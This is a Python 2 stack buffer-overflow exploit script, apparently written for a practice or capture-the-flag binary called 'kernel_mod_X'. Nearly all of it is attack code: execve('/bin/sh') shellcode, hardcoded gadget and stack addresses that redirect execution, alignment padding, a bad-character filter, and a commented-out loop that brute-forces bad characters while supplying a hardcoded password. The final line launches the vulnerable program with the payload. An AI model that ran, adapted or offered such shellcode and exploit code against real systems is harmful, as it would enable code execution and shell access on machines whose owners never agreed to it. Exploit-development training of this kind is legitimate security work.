#!/usr/bin/env python
import struct
import os

from subprocess import Popen, PIPE

password = "ro46lese6urity"
#endianess conversion
def conv(num):
 return struct.pack("<I",num)

payload = "\x6a\x0b\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"	#execve("/bin/sh") shellcode
payload += "\x74\x2e\x07\x06\x83\xeb\xfc\xe2\xf4\x1e\x25\x5f\x9f"
payload += "\x26\x48\x6f\x2b\x17\xa7\xe0\x6e\x5b\x5d\x6f\x06\x1c"
payload += "\x01\x65\x6f\x1a\xa7\xe4\x54\x9c\x26\x07\x06\x74\x01"
payload += "\x65\x6f\x1a\x01\x74\x6e\x74\x79\x54\x8f\x95\xe3\x87"
payload += "\x06"


badchars = "\x30\x31\x41\x42\x43\x61\x62\x63\x00"


call_eax = 0x0804851f  			# 0x0804851f: call eax;
load_eax = 0x08048a8e  			# 0x08048a8e: add eax, ebp; ret;
payload_in_stack = 0xbffff2e0	# payload start

buf = "'"+("g" * 60)
buf += "o" * 60			            #alligment junk
buf += conv(payload_in_stack)   	#ebx
buf += conv(payload_in_stack)   	#ebp
buf += conv(load_eax)     	    	#eip
buf += conv(call_eax)			    #hit the paydirt
buf += "x" * 92				        #more aligment junk
buf += "l" * 92
buf += "z" * 92
buf += "p" * (90-len(payload))
buf += payload+"pp"+"'"			    #

abort = False
for char in badchars:
    for byte in buf:
        if byte == char:
            print "badchar detected."+char+" "+(char.encode("hex"))
            abort = True
if abort:
    quit()

print "Calling vulnerable program"

#Bad char enumeration code
#print buf
#for x in range(0,255):
#	try:
#		p = Popen(['./kernel_mod_X A A '+buf+chr(int(hex(x),16))+"'"], stdout=PIPE, stdin=PIPE, stderr=PIPE, shell=True)
#		out, err = p.communicate(input=str(password+"\n").encode())
#		if "Seg" not in err:
#			print hex(x)
#	except:
#		print hex(x)
#		pass

os.system('./kernel_mod_X A A '+buf)
